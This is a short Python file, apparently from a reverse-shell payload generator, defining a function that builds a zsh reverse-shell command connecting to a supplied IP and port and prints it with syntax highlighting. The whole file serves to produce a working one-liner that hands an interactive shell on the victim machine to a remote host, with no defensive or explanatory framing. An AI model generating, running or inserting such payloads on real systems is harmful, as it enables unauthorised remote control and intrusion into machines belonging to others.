from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def zsh_reverse_shell(ip, port):
    payload = f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")